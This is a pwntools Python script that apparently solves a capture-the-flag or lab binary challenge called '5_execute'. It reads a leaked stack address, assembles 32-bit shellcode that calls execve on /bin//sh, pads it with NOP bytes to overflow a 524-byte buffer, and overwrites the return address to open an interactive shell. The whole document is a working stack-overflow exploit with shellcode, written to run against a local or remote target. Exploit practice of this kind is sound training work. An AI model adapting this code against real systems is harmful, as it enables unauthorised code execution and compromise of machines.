from pwn import *

#context.log_level = "debug"
remote = False

IP = ""
PORT = ""
FILENAME = "./5_execute"

if remote:
    p = remote(IP, PORT)
    elf = ELF(FILENAME)
else:
    p = process(FILENAME)
    elf = p.elf

p.recvuntil("stack: ")
stack_addr = int(p.recvline()[:-1], 16)
log.info(stack_addr)

shellcode = asm('''
xor eax, eax
xor ecx, ecx
xor edx, edx

push 0x68732f2f
push 0x6e69622f
mov ebx, esp
push eax
push ebx

mov ecx, esp
mov al, 0xb
int 0x80
''')

payload = shellcode + b"\x90" * (524 - len(shellcode)) + pack(stack_addr)
p.sendlineafter("choice", payload)

p.interactive()
